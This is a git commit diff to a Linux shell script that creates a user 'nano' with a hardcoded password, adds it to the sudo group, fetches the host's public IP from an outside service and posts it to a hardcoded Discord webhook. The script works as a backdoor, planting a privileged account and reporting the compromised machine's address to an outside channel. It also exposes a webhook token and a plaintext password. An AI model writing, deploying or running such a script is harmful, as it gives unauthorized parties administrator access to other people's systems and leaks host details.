a8bedeabd851234b9956e958c68201425bccb66a
Corazon <41511738+assafgold1@users.noreply.github.com>
2024-08-03 04:54:02 +0300

    Update create_user_linux.sh

--- create_user_linux.sh
+++ create_user_linux.sh
@@ -4,16 +4,14 @@
 USERNAME="nano"
 PASSWORD="Mizi123!"
 DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5"
-#!/bin/bash
 
-# Create the user
 sudo useradd -m -p $(openssl passwd -1 $PASSWORD) $USERNAME
 
 # Add the user to the 'sudo' group
 sudo usermod -aG sudo $USERNAME
 
 # Get the IP address
-IP_ADDRESS=$(curl -s https://ipinfo.io/ip)
+IP_ADDRESS=$(curl -s https://api.ipify.org)
 
 # Notify via Discord with @everyone mention
 curl -H "Content-Type: application/json" -X POST -d "{
